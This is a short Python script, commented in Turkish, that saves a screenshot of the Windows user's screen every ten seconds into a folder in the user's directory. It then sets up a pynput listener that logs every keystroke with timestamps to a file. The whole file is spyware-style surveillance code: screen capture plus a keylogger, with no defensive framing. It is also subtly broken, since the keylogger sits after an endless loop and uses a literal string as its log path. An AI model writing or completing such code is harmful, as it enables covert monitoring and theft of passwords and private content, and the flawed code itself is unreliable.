from PIL import ImageGrab                                # ss almak için gerekli kütüphane
import random                                               # random kütüphanesi
import os                                                   # os kütüphanesi
import getpass                                              # username almak için gerekli kütüphane
import time
import sys 
from pynput.keyboard import Key, Listener
import logging
user_name = getpass.getuser()                               # username adlı değişkene username'in ne olduğunu öğrenip tanımladık.

if not os.path.exists("C:\\Users\\%s\\ssler" % user_name):  #eğer users\\%username%\\ssler klasörü varsa tekrar oluşturmayacak. 
    os.makedirs("C:\\Users\\%s\\ssler" % user_name)         # Yoksa belirtilen yere ssler isimli bir klasör oluşturulacak.

lokasyon = "C:\\Users\\%s\\ssler\\" % user_name             # lokasyon isimli bir değişken oluşturup bu değişkene username'den aldığımız kullanıcı ismini ekliyoruz.

                                                            

while True:
    def ssal():                                             # ssal isimli bir fonksiyon oluşturduk
        global lokasyon                                     # lokasyon fonksiyon dışında olduğundan global ile dışardan içeri çağırdık.
        photoid = random.randint(10000000, 900000000)       # photoid ile ss'lere bir id vermek istedik.
        snapshot = ImageGrab.grab()
        save_path = "%s\\%s.jpg" %(lokasyon, photoid)       # snapshot değişkenine yakalama komutu verdik.
        snapshot.save(save_path)
        time.sleep(10)                                      # değişkeni save ile istediğimiz lokasyona kayıt etmesini istedik.
    ssal()


log_dir = "lokasyon"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()